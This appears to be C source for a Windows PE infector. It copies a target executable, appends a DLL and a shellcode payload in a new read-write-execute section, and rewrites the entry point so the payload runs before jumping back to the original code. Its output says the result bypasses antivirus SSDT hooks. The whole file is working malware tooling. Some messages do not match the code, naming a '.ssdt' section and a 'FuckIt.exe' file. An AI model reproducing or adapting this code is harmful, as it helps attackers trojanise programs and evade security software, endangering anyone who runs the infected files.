#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <Dbghelp.h>

BOOL CheckPe(FILE* pFile)
{
	fseek(pFile, 0, SEEK_SET);
	BOOL	bFlags = FALSE;
	WORD	IsMZ;
	DWORD	IsPE, pNT;
	fread(&IsMZ, sizeof(WORD), 1, pFile);
	if (IsMZ == 0x5A4D)
	{
		fseek(pFile, 0x3c, SEEK_SET);
		fread(&pNT, sizeof(DWORD), 1, pFile);
		fseek(pFile, pNT, SEEK_SET);
		fread(&IsPE, sizeof(DWORD), 1, pFile);
		if (IsPE == 0X00004550)
			bFlags = TRUE;
		else
			bFlags = FALSE;
	}
	else
		bFlags = FALSE;
	fseek(pFile, 0, SEEK_SET);
	return bFlags;
}

//用来计算对齐数据后的大小
int alig(int size, unsigned int align)
{
	if (size%align != 0)
		return (size / align + 1)*align;
	else
		return size;
}

DWORD PEAlign(DWORD TarNum, DWORD AlignTo)
{
	while (TarNum % AlignTo != 0)
	{
		TarNum++;
	}
	return TarNum;
}
int myX32code();
int myX64code();
#if _WIN64
typedef struct {
	DWORD64 code_start;
	DWORD64 code_len;
}XCODEHEAD;
#else
typedef struct {
	DWORD code_start;
	DWORD code_len;
}XCODEHEAD;
#endif


int main(int argc, char* argv[])
{
	
	unsigned int Baseaddr = 0;
	unsigned int Vaddr = 0;
	unsigned int Oaddr = 0;
	unsigned int faddr = 0;
	FILE* SFile=NULL;
	errno_t err;

	WCHAR *targetfilename = L"..\\target\\target.exe";
	WCHAR *DFileName =		L"..\\TLStest\\TLStest.dll";
	//WCHAR *DFileName =		L"testdll.dll";
	WCHAR *szXFile =		L"Xtarget.exe";

	
	err = _wfopen_s(&SFile, targetfilename, L"rb");
	if (SFile == NULL)
	{
		printf("[-]i can't open your file!\n");
		exit(-1);
	}
	if (!CheckPe(SFile))
	{
		printf("[-]it's a invalid pe......!\n");
		exit(-1);
	}
	
	if (!CopyFile(targetfilename, szXFile, 0))
	{
		printf("[-]backup your file faild!(%d)\n", GetLastError());
		exit(-1);
	}
	IMAGE_NT_HEADERS NThea;
	fseek(SFile, 0x3c, 0);
	PVOID pNT;
	fread(&pNT, sizeof(DWORD), 1, SFile);
	fseek(SFile, pNT, 0);
	fread(&NThea, sizeof(IMAGE_NT_HEADERS), 1, SFile);
	int nOldSectionNo = NThea.FileHeader.NumberOfSections;
	int OEP = NThea.OptionalHeader.AddressOfEntryPoint;
	int SECTION_ALIG = NThea.OptionalHeader.SectionAlignment;
	int FILE_ALIG = NThea.OptionalHeader.FileAlignment;
	
	Baseaddr = NThea.OptionalHeader.ImageBase;

	//定义要添加的区块
	IMAGE_SECTION_HEADER	NewSection;
	//将该结构全部清零
	memset(&NewSection, 0, sizeof(IMAGE_SECTION_HEADER));
	//再定义一个区块，来存放原文件最后一个区块的信息
	IMAGE_SECTION_HEADER SEChea;
	//再定义一个区块，来存放原文件目标地址块
	IMAGE_SECTION_HEADER TSHead;
	//读原文件最后一个区块的信息
	fseek(SFile, (DWORD)pNT + sizeof(IMAGE_NT_HEADERS), 0);
	for (int i = 0; i < nOldSectionNo; i++)
		fread(&SEChea, sizeof(IMAGE_SECTION_HEADER), 1, SFile);
	
	FILE *XFile = NULL;
	err	= _wfopen_s(&XFile,szXFile, L"rb+");
	if (XFile == NULL)
	{
		printf("\t\t[-]Open backup file faild..\n");
		exit(-1);
	}
	
	char *pXCODE =NULL;
	int nXCODELen = 0;
	
	DWORD DFileLen = 0;
	NewSection.VirtualAddress = SEChea.VirtualAddress + alig(SEChea.Misc.VirtualSize, SECTION_ALIG);
	//dll
	FILE *DFile = NULL;
	
	err = _wfopen_s(&DFile, DFileName, L"rb");
	if (DFile == NULL)
	{
		printf("\t\t[-]Open backup file faild..\n");
		exit(-1);
	}
	fseek(DFile, 0, SEEK_END);
	DFileLen = ftell(DFile);
	fseek(DFile, 0, SEEK_SET);
	fseek(XFile, SEChea.PointerToRawData + SEChea.SizeOfRawData, SEEK_SET);
	for (int i = 0; i<DFileLen; i++)
		fputc(fgetc(DFile), XFile);

	fwrite(&DFileLen, 4, 1, XFile);
	DFileLen += 4;

	//XCODE
	XCODEHEAD xcodehead;
	memset(&xcodehead, 0, sizeof(XCODEHEAD));
	myX32code(&xcodehead);
	nXCODELen = xcodehead.code_len;
	pXCODE = xcodehead.code_start;
	if (pXCODE == NULL)
	{
		printf("\t\t[-]Xcode is NULL\n");
		exit(-1);
	}
	printf("[+]Writing ShellCode......");
	fseek(XFile, SEChea.PointerToRawData + SEChea.SizeOfRawData+ DFileLen, SEEK_SET);
	
	for (int i = 0; i<nXCODELen; i++)
		fputc(pXCODE[i], XFile);
	printf("Ok!\n");
	//XCODE, and jmp back 

	DWORD oep = NThea.OptionalHeader.AddressOfEntryPoint;
	DWORD oft = oep - (NewSection.VirtualAddress + nXCODELen + DFileLen +5);
	char jmp = 0xE9;
	
	fwrite(&jmp,1, 1, XFile);
	fwrite(&oft,4, 1, XFile);
	nXCODELen = nXCODELen + 5;

	
	//将最后增加的数据用0填充至按文件中对齐的大小
	for (int i = 0;i<alig(nXCODELen+ DFileLen, FILE_ALIG) - nXCODELen - DFileLen;i++)
		fputc('\0', XFile);
	//新区块中的数据
	printf("[+]Writing a New Section Named \".ssdt\"...\n");
	strcpy_s((char*)NewSection.Name, IMAGE_SIZEOF_SHORT_NAME, ".Xcode");
	NewSection.PointerToRawData = SEChea.PointerToRawData + SEChea.SizeOfRawData;
	NewSection.Misc.VirtualSize = nXCODELen + DFileLen;
	NewSection.SizeOfRawData = alig(nXCODELen + DFileLen, FILE_ALIG);
	NewSection.Characteristics = 0xE0000020;//新区块可读可写可执行
	
	
	
	//写入新的块表
	fseek(XFile, (DWORD)pNT + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER)*nOldSectionNo, 0);
	fwrite(&NewSection, sizeof(IMAGE_SECTION_HEADER), 1, XFile);
	printf("[+]Write New Section Table To File....\n");
	
	int nNewImageSize = NThea.OptionalHeader.SizeOfImage + alig(nXCODELen + DFileLen, SECTION_ALIG);
	int nNewSizeofCode = NThea.OptionalHeader.SizeOfCode + alig(nXCODELen + DFileLen, FILE_ALIG);
	fseek(XFile, pNT, 0);
	NThea.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
	NThea.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
	NThea.OptionalHeader.SizeOfCode = nNewSizeofCode;
	NThea.OptionalHeader.SizeOfImage = nNewImageSize;
	NThea.FileHeader.NumberOfSections = nOldSectionNo + 1;
	NThea.OptionalHeader.AddressOfEntryPoint = NewSection.VirtualAddress+ DFileLen;														//OEP
	//写入更新后的PE头结构
	fwrite(&NThea, sizeof(IMAGE_NT_HEADERS), 1, XFile);
	
	printf("[+]Write New PE Headers....\n");
	printf("[+]All ok.........!!\n");
	printf("[+]please test FuckIt.exe for bypass AV's SSDT&shadow SSDT hook!~~\n");
	
	fclose(XFile);
	fclose(SFile);
	//AddFuckAVSection();
	return 0;
}